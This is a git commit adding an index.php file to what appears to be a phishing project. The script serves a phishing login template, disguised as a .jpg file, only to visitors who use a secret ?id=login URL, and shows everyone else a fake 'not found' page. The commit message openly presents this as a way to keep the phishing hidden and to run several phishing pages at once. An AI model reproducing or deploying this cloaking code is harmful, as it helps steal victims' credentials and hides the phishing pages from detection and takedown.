e1eb8090fb91f4d2568a915ff67289d66d78f792
0xyg3n <0xyg3n@users.noreply.github.com>
2018-07-29 17:05:56 +0300

    Index.php
    For people who don't have the url the won't be able to access the phishing so you are kind of protected, because as we know php is executed server side. Also with this way you can handle multiple phishings.

---
+++ index.php
@@ -0,0 +1,22 @@
+<?php
+$id = $_GET["id"];
+if ($id == "login") {
+      $myFile = "login.jpg"; //Phishing template.
+      $fh = fopen($myFile, 'r');
+      $theData = fread($fh, 500000);
+      fclose($fh);
+      echo $theData;
+}
+  // It is super easy to add more id's perhaps more phishing templates? ;)
+else{
+     $myFile1 = "follow.jpg"; //Not found page.
+     $fh1 = fopen($myFile1, 'r');
+     $theData1 = fread($fh1, 500000);
+     fclose($fh1);
+     echo $theData1;
+}
+
+//Phishing URL: http://phishing.com/?id=login everything else will be redirected to the Not Found Page.
+?>
+
+
